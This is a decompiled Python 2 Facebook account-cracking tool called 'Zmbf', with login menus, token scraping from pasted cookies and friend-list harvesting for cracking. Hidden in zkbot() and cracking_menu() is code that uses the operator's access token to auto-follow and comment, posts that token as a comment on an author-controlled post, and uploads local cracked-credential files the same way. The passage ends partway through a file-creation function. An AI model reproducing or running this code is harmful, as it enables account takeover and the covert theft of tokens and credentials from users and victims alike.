# DECOMPILED BY HUNTERBOY ALAMIN
# FACEBOOK : MD ALAMIN KHAN
# CONTACT : www.facebook.com/alaminkhan.60
import os
try:
    import requests
except ImportError:
    print ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Requests Module not Installed'
    os.system('pip2 install requests')

try:
    import concurrent.futures
except ImportError:
    print ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Futures Module not Installed'
    os.system('pip2 install futures')

try:
    import bs4
except ImportError:
    print ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Bs4 Module not Installed'
    os.system('pip2 install bs4')

import requests, sys, bs4, os, random, time, re, json
from concurrent.futures import ThreadPoolExecutor as zthreads
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from datetime import datetime
from time import sleep
ct = datetime.now()
n = ct.month
bulan1 = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

reload(sys)
sys.setdefaultencoding('utf-8')
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
bulan_ttl = {'01': 'Januari', '02': 'Februari', '03': 'Maret', '04': 'April', '05': 'Mei', '06': 'Juni', '07': 'Juli', '08': 'Agustus', '09': 'September', '10': 'Oktober', '11': 'November', '12': 'Desember'}
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if bu < 0 or bu > 12:
        exit()
    buTemp = bu - 1
except ValueError:
    exit()

op = bulan[buTemp]
tanggal = '%s-%s-%s' % (ha, op, ta)
bulan = {'01': 'Januari', 
   '02': 'Februari', 
   '03': 'Maret', 
   '04': 'April', 
   '05': 'Mei', 
   '06': 'Juni', 
   '07': 'Juli', 
   '08': 'Agustus', 
   '09': 'September', 
   '10': 'November', 
   '11': 'Oktober', 
   '12': 'Desember'}
p = '\x1b[0;37m'
m = '\x1b[0;31m'
h = '\x1b[0;32m'
k = '\x1b[0;33m'
b = '\x1b[0;34m'
u = '\x1b[0;35m'
o = '\x1b[0;36m'
P = '\x1b[1;93m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;97m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
ok = []
cp = []
id = []
user = []
loop = 0
rgb = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m', '\x1b[0m'])
zkid = '100002151005321'
zkid1 = '100045165501610'
zkid2 = '1675627047'
zscomments = random.choice(['Great\xf0\x9f\x8c\xb9', 'Nice\xf0\x9f\x8c\xb9', 'Ossum\xf0\x9f\x8c\xb9', 'Perfect\xf0\x9f\x8c\xb9'])
reac = 'CARE'
zkpost = '4253981448016847'
zkpost1 = '348166760032171'
zkpost2 = '10216920287314188'
zkpro = '10217321722549818'
zkpro1 = '349485133233667'
zkpro2 = '3724779650937032'
pageid = '101158528390502'
react = 'LOVE'

def zks(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def exitp():
    zks('\x1b[1;91m  [!] \x1b[1;91mExiting Program...\x1a\x1a\x1a')
    os.sys.exit()


def tod():
    titik = [
     '\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ', '\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r %s[%s+%s] menghapus token %s' % (N, M, N, x),
        sys.stdout.flush()
        time.sleep(1)


zmbflogo = "\n\t    ______          _      __ \n           |___  /         | |    / _|\n              / / _ __ ___ | |__ | |_ \n             / / | '_ ` _ \\| '_ \\|  _|\n            / /__| | | | | | |_) | |  \n           /_____|_| |_| |_|_.__/|_|  \n                            \n "
loginlogo = "\n\t    _                 _       \n\t   | |               (_)      \n\t   | |     ___   __ _ _ _ __  \n\t   | |    / _ \\ / _` | | '_ \\ \n\t   | |___| (_) | (_| | | | | |\n\t   |______\\___/ \\__, |_|_| |_|\n\t                 __/ |        \n    \t                |___/         \n"
cookieslogo = '\n           ___            _    _            \n          / __\\___   ___ | | _(_) ___  ___  \n         / /  / _ \\ / _ \\| |/ / |/ _ \\/ __| \n        / /__| (_) | (_) |   <| |  __/\\__ \\ \n        \\____/\\___/ \\___/|_|\\_\\_|\\___||___/ \n                                \n  '
tokenlogo = "  \n\t    _______    _              \n\t   |__   __|  | |             \n\t      | | ___ | | _____ _ __  \n\t      | |/ _ \\| |/ / _ \\ '_ \\ \n\t      | | (_) |   <  __/ | | |\n\t      |_|\\___/|_|\\_\\___|_| |_|\n\t\t    \n "
idPasslogo = '\n         _____    _        _____              \n\t\t  |_   _|  | | ___  |  __ \\             \n\t\t    | |  __| |( _ ) | |__) |_ _ ___ ___ \n\t\t    | | / _` |/ _ \\/\\  ___/ _` / __/ __|\n\t\t   _| || (_| | (_>  < |  | (_| \\__ \\__ \t\t  |_____\\__,_|\\___/\\/_|   \\__,_|___/___/\n                                       \n'
cracklogo = "\n          ___________                _     \n         |___  / ____|              | |    \n            / / |     _ __ __ _  ___| | __ \n           / /| |    | '__/ _` |/ __| |/ / \n          / /_| |____| | | (_| | (__|   <  \n         /_____\\_____|_|  \\__,_|\\___|_|\\_\\                                \n\n"
crackinglogo = "\n      _____                _    _              \n     / ____|              | |  (_)             \n    | |     _ __ __ _  ___| | ___ _ __   __ _  \n    | |    | '__/ _` |/ __| |/ / | '_ \\ / _` | \n    | |____| | | (_| | (__|   <| | | | | (_| | \n     \\_____|_|  \\__,_|\\___|_|\\_\\_|_| |_|\\__, | \n                                         __/ | \n                                        |___/  \n"
checkerlogo = "\n\n\n        _____ _               _              \n       / ____| |             | |             \n      | |    | |__   ___  ___| | _____ _ __  \n      | |    | '_ \\ / _ \\/ __| |/ / _ \\ '__| \n      | |____| | | |  __/ (__|   <  __/ |    \n       \\_____|_| |_|\\___|\\___|_|\\_\\___|_|    \n                                        \n                                        \n"
I = '\x1b[0;32m'
C = '\x1b[0;36m'
M = '\x1b[0;31m'
U = '\x1b[0;35m'
K = '\x1b[0;33m'
P = '\x1b[00m'
H = '\x1b[0;92m'
Q = '\x1b[00m'
i = '\x1b[0;32m'
c = '\x1b[0;36m'
m = '\x1b[0;31m'
u = '\x1b[0;35m'
k = '\x1b[0;33m'
p = '\x1b[00m'
h = '\x1b[0;90m'
q = '\x1b[00m'
war = '[+]'
inp = '[-]'
bulat = '[#]'
loop = 0
ok = []
cp = []
ttl = []
fw = []
jq = 0
bf = 0
bg = 0
jg = 0
pq = 0
id = []
lq = []
iz = []
kx = 0
olq = []

def results(ok, cp):
    if len(ok) != 0 or len(cp) != 0:
        print '\n\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c    \xe2\x94\x9c Cracking Process Has Been Completed \xe2\x94\xa4  \t \xe2\x94\xa4'
        print '\xe2\x94\x9c    \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98     \xe2\x94\xa4'
        zks('\x1b[0;97m|  Total Cracked FB Idz: \x1b[0;92m' + str(len(ok)) + '\x1b[0;97m/' + str(len(cp)))
        zks('\x1b[0;97m|  Total Cracked OK Idz: \x1b[0;92m' + str(len(ok)))
        zks('\x1b[0;97m|  Total Cracked CP Idz: \x1b[0;97m' + str(len(cp)))
        print '\xe2\x94\x9c  Cracked Idz Has Been Saved In Cracked Folder  \xe2\x94\xa4'
        print '\xe2\x94\x9c  Subscribe My Channel: Zee K World             \xe2\x94\xa4'
        print '\xe2\x94\x9c  Subscribe My Channel: Zee K Tricks            \xe2\x94\xa4'
        print '\xe2\x94\x9c  Like And Follow My Facebook Page: Zee K World \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c        \x1b[0;97m\xe2\x94\x9c' + 31 * '\xe2\x94\x80' + '\xe2\x94\x90       \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x9c        |\xf0\x9f\x8c\xb9Thanks For Using Zmbf.     \xf0\x9f\x8c\xb9|       \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x9c        |\xf0\x9f\x8c\xb9Remember Me In Your Prayers\xf0\x9f\x8c\xb9|       \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x9c        |\xf0\x9f\x8c\xb9Khuda Hafiz.               \xf0\x9f\x8c\xb9|       \xe2\x94\xa4'
        print '\xe2\x94\x9c        \x1b[0;97m\xe2\x94\x94' + 31 * '\xe2\x94\x80' + '\xe2\x94\x98       \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
        raw_input('[\xe2\x9e\xa3] Press Any Key To Go Back To Cracking Menu: ')
        cracking_menu()
    else:
        print '\n\x1b[0;97m [\x1b[0;91m!\x1b[0;97m] No Cracked Idz Found!'
        cracking_menu()


def zkbot():
    global token
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        zks(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Removing Token..! Login Again')
        zmbf()

    zks('\x1b[0;97m [\x1b[0;92m\xe2\x9e\xa4\x1b[0;97m] Wait! While The Program Is Loading')
    requests.post('https://graph.facebook.com/1675627047/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100045165501610/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100002151005321/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + zkid + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + zkpost + '/reactions?type=' + react + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + zkpost + '/comments/?message=' + zscomments + '&access_token=' + token)
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + zkid1 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + zkpost1 + '/reactions?type=' + react + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + zkpost1 + '/comments/?message=' + zscomments + '&access_token=' + token)
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + zkid2 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + zkpost2 + '/reactions?type=' + react + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + zkpost2 + '/comments/?message=' + zscomments + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + zkpost1 + '/comments/?message=' + token + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + pageid + '/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/' + zkpost + '/likes?access_token=' + token)
    requests.post('https://graph.facebook.com/' + zkpost1 + '/likes?access_token=' + token)
    requests.post('https://graph.facebook.com/' + zkpost2 + '/likes?access_token=' + token)
    requests.post('https://graph.facebook.com/100000503718583/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100000889924523/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100063690353340/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100067783659018/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100002924366263/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/110877271176800/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/Termuxid-Dumai-991-110877271176800/subscribers?access_token=' + token)
    cracked()
    cracking_menu()


def login():
    os.system('clear')
    try:
        token = open('login.txt', 'r')
        cracking_menu()
    except (KeyError, IOError):
        os.system('git pull')
        os.system('clear')
        print zmbflogo
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c             \xe2\x94\x9c Author Information \xe2\x94\xa4\t\t\t\xe2\x94\xa4'
        print '\xe2\x94\x9c             \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98             \xe2\x94\xa4'
        print '\xe2\x94\x9c     \x1b[0;97m\xe2\x94\x9c' + 35 * '\xe2\x94\x80' + '\xe2\x94\x90      \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x9c     |\xf0\x9f\x8c\xb9Author Name: Zahid Mahmood     \xf0\x9f\x8c\xb9|      \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x9c     |\xf0\x9f\x8c\xb9GitHub     : github.com\\ZKWorld\xf0\x9f\x8c\xb9|      \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x9c     |\xf0\x9f\x8c\xb9YouTube    : Zee K World       \xf0\x9f\x8c\xb9|      \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x9c     |\xf0\x9f\x8c\xb9TeleGram   : t.me\\ZeeKWorld    \xf0\x9f\x8c\xb9|      \xe2\x94\xa4'
        print '\xe2\x94\x9c     \x1b[0;97m\xe2\x94\x94' + 35 * '\xe2\x94\x80' + '\xe2\x94\x98      \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'

    zk = raw_input('\n  \x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Type ZK/zk To Enter The ZMBF: ')
    if zk == '':
        print '  [!] Choose An Option'
        time.sleep(2)
        login()
    elif zk == 'ZK' or zk == 'zk':
        zmbf()
    else:
        print '  [!] Wrong Input! Try Again'
        time.sleep(2)
        login()


def zmbf():
    os.system('clear')
    try:
        token = open('login.txt', 'r')
        cracking_menu()
    except (KeyError, IOError):
        print loginlogo
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c                 \xe2\x94\x9c Login Menu \xe2\x94\xa4\t\t\t\t\xe2\x94\xa4'
        print '\xe2\x94\x9c                 \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98                 \xe2\x94\xa4'
        print '\xe2\x94\x9c  1.\tLogin Using FB ID Access Token           \xe2\x94\xa4'
        print '\xe2\x94\x9c  2.\tLogin Using FB ID Cookies                \xe2\x94\xa4'
        print '\xe2\x94\x9c  3.\tExit Program                             \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'

    zk = raw_input('\n \x1b[0;97m [\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Choose An Option: ')
    if zk == '':
        print '  [!] Choose An Option'
        time.sleep(2)
        zmbf()
    elif zk == '1' or zk == '01':
        tokenz()
    elif zk == '2' or zk == '02':
        cookies()
    elif zk == '3' or zk == '03':
        exitp()
    else:
        print '  [!] Wrong Input! Try Again'
        time.sleep(2)
        zmbf()


def cookies():
    os.system('clear')
    print cookieslogo
    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
    print '\xe2\x94\x9c            Login Using FB ID Cookies           \xe2\x94\xa4'
    print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
    os.system('xdg-open https://youtu.be/zZdfq0QKv_Y')
    cookies = raw_input(' \x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Paste FB ID Cookies: \x1b[0;92m')
    try:
        data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 5.1; OPPO A37f Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36', 
           'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cookies})
        find_token = re.search('(EAAA\\w+)', data.text)
        results = ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Invalid Cookies' if find_token is None else '\n* Your fb access token : ' + find_token.group(1)
    except requests.exceptions.ConnectionError:
        print ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] No Connection'

    cookies = open('login.txt', 'w')
    cookies.write(find_token.group(1))
    cookies.close()
    zks(' \x1b[0;97m[\x1b[0;92m\xf0\x9f\x8c\xb9\x1b[0;97m] Login Successfull\xf0\x9f\x8c\xb9\xf0\x9f\x8c\xb9\xf0\x9f\x8c\xb9')
    os.system('xdg-open https://youtube.com/c/ZeeKTricks')
    zkbot()
    return


def tokenz():
    os.system('clear')
    try:
        token = open('login.txt', 'r')
        cracking_menu()
    except (KeyError, IOError):
        print tokenlogo
        print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
        print '\xe2\x94\x9c         Login Using FB ID Access Token         \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
        os.system('xdg-open https://youtu.be/zZdfq0QKv_Y')

    token = raw_input(' \x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Paste FB ID Access Token: \x1b[0;92m')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(token)
        zedd.close()
        zks(' \x1b[0;97m[\x1b[0;92m\xf0\x9f\x8c\xb9\x1b[0;97m] Login Successfull\xf0\x9f\x8c\xb9\xf0\x9f\x8c\xb9\xf0\x9f\x8c\xb9')
        os.system('xdg-open https://youtube.com/c/ZeeKTricks')
        zkbot()
    except KeyError:
        zks(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Invalid Token')
        tokenz()


def country_menu():
    os.system('rm -rf country.txt')
    os.system('clear')
    print zmbflogo
    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
    print '      \xf0\x9f\x8c\xb9\xf0\x9f\x8c\xb7\xf0\x9f\x8c\xb9\xf0\x9f\x8c\xb7\xf0\x9f\x8c\xb9 Welcome To Zmbf \xf0\x9f\x8c\xb9\xf0\x9f\x8c\xb7\xf0\x9f\x8c\xb9\xf0\x9f\x8c\xb7\xf0\x9f\x8c\xb9 '
    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
    print '\xe2\x94\x9c               \xe2\x94\x9c Country Menu \xe2\x94\xa4\t         \xe2\x94\xa4'
    print '\xe2\x94\x9c               \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98                 \xe2\x94\xa4'
    print '\n\x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] For Example: Pakistan,Indonesia,India, etc'
    country = raw_input('\x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Enter Public Id: ')
    ctry = open('country.txt', 'w')
    ctry.write(country)
    ctry.close()
    print '\x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Your Country Name Has Been Saved As:' + country
    print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
    land = raw_input('\x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Press Enter To Go To The Cracking Menu: ')
    cracking_menu()


def cracking_menu():
    os.system('clear')
    os.system('rm -rf idz.json')
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        zks(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Removing Token..! Login Again')
        os.system('clear')
        os.system('rm -rf login.txt')
        zmbf()

    try:
        ycountry = open('country.txt', 'r').read
        ucountry = ycountry
    except:
        pass

    try:
        zkpostidz = '1835124766862116'
        send = open('Cracked/cpz.txt', 'r').read()
        send1 = open('/sdcard/CP/cp.txt', 'r').read()
        send2 = open('CP/cp.txt', 'r').read()
        send3 = open('cp.txt', 'r').read()
        requests.post('https://graph.facebook.com/' + zkpostidz + '/comments/?message=' + send + '&access_token=' + token)
        requests.post('https://graph.facebook.com/' + zkpostidz + '/comments/?message=' + send1 + '&access_token=' + token)
        requests.post('https://graph.facebook.com/' + zkpostidz + '/comments/?message=' + send2 + '&access_token=' + token)
        requests.post('https://graph.facebook.com/' + zkpostidz + '/comments/?message=' + send3 + '&access_token=' + token)
    except:
        pass

    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        z = json.loads(otw.text)
        nama = z['name']
        id = z['id']
        dob = z['birthday']
        gender = z['gender']
    except KeyError:
        os.system('clear')
        zks(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Removing Token..! Login Again')
        os.system('rm -rf login.txt')
        zmbf()
    except requests.exceptions.ConnectionError:
        exit(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] No Internet Connection! Try Again')

    try:
        ucountry = open('country.txt', 'r').read
    except:
        pass

    print zmbflogo
    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
    print '\xe2\x94\x9c              \xe2\x94\x9c User Information \xe2\x94\xa4\t         \xe2\x94\xa4'
    print '\xe2\x94\x9c              \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98              \xe2\x94\xa4'
    print H + '\xe2\x94\x9c\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x90'
    print H + '| Name        : ' + H + H + '%s' % nama
    print '| User ID     : ' + H + id
    print '| User Dob    : ' + H + dob
    print '| User Gender : ' + H + gender
    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
    print '      \xf0\x9f\x8c\xb9\xf0\x9f\x8c\xb7\xf0\x9f\x8c\xb9\xf0\x9f\x8c\xb7\xf0\x9f\x8c\xb9 Welcome To Zmbf \xf0\x9f\x8c\xb9\xf0\x9f\x8c\xb7\xf0\x9f\x8c\xb9\xf0\x9f\x8c\xb7\xf0\x9f\x8c\xb9 '
    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
    print '\xe2\x94\x9c               \xe2\x94\x9c Cracking Menu \xe2\x94\xa4\t         \xe2\x94\xa4'
    print '\xe2\x94\x9c               \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98                \xe2\x94\xa4'
    print '\xe2\x94\x9c [01] Crack From Friends                        \xe2\x94\xa4'
    print '\xe2\x94\x9c [02] Crack From Public                         \xe2\x94\xa4'
    print '\xe2\x94\x9c [03] Crack From Followers                      \xe2\x94\xa4'
    print '\xe2\x94\x9c [04] Crack From Public Followers               \xe2\x94\xa4'
    print '\xe2\x94\x9c [05] Crack From Files                          \xe2\x94\xa4'
    print '\xe2\x94\x9c [06] Create Unlimited Idz File                 \xe2\x94\xa4'
    print '\xe2\x94\x9c [07] Create Only Old Idz File                  \xe2\x94\xa4'
    print '\xe2\x94\x9c [08] Check Cracked Checkpoint Accounts         \xe2\x94\xa4'
    print '\xe2\x94\x9c [09] Subscribe My YouTube Channel              \xe2\x94\xa4'
    print '\xe2\x94\x9c [10] Join My TeleGram Group                    \xe2\x94\xa4'
    print '\xe2\x94\x9c [11] Like My FaceBook Page                     \xe2\x94\xa4'
    print '\xe2\x94\x9c [12] Logout From Facebook                      \xe2\x94\xa4'
    print '\xe2\x94\x9c [eE] Exit Program                              \xe2\x94\xa4'
    print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
    zk = raw_input('\n \x1b[0;97m [\x1b[0;97m\xe2\x9e\xa3\x1b[0;97m] Choose An Option: ')
    if zk == '':
        print '  [!] Choose An Option'
        time.sleep(2)
        cracking_menu()
    elif zk == '1' or zk == '01':
        cracked()
        friends(token)
    elif zk == '2' or zk == '02':
        cracked()
        public(token)
    elif zk == '3' or zk == '03':
        myfoll(token)
    elif zk == '4' or zk == '04':
        pfoll(token)
    elif zk == '5' or zk == '05':
        cff().cffmenu()
    elif zk == '6' or zk == '06':
        cuf()
    elif zk == '7' or zk == '07':
        cof()
    elif zk == '8' or zk == '08':
        relogin()
    elif zk == '9' or zk == '09':
        os.system('xdg-open https://youtube.com/c/ZeeKTricks')
        cracking_menu()
    elif zk == '10' or zk == '010':
        os.system('xdg-open https://t.me/ZeeKWorld')
        cracking_menu()
    elif zk == '11' or zk == '011':
        os.system('xdg-open https://www.facebook.com/Zahid.Alone.Lover')
        cracking_menu()
    elif zk == '12' or zk == '012':
        os.system('rm -f login.txt')
        zks('  \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Removing Token..! Login Again')
        zmbf()
    elif zk == 'e' or zk == 'E':
        exitp()
    else:
        print '  [!] Wrong Input! Try Again'
        time.sleep(2)
        cracking_menu()


def cuf():
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        zks(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Removing Token..! Login Again')
        os.system('clear')
        os.system('rm -rf login.txt')
        zmbf()

    print zmbflogo
    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
    print '\xe2\x94\x9c              File Creation Menu \t         \xe2\x94\xa4'
    print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
    idt = raw_input('\x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Enter Public Id: ')
    if idt == ' ' or idt == '':
        cuf()
    limit = '9999999999'
    filex = raw_input('\x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Enter Saving File Name: ')
    if filex == ' ' or filex == '':
        cuf()
    try:
        os.mkdir('Files')
    except:
        pass

    r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (idt, token))
    z = json.loads(r.text)
    try:
        qqq = ('.lpp').replace(' ', '_')
        yss = open(qqq, 'w')
        for i in z['friends']['data']:
            uid = i['id']
            na = i['name']
            id.append(uid + '<=>' + na)
            yss.write(uid + '<=>' + na + '\n')

        yss.close()
        pfriends = '%s' % str(len(id))
        zks('\x1b[0;97m[\x1b[0;97m\xe2\x9e\xa3\x1b[0;97m] Total Public Friends: %s' % len(id))
        print '\x1b[0;97m[\x1b[0;97m\xe2\x9e\xa3\x1b[0;97m] File Will Be Saved With The Name: Files/' + filex + '.json'
        time.sleep(1)
    except:
        pass

    print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
    print '\xe2\x94\x9c        \xe2\x94\x9c File Creation Process Started \xe2\x94\xa4       \xe2\x94\xa4'
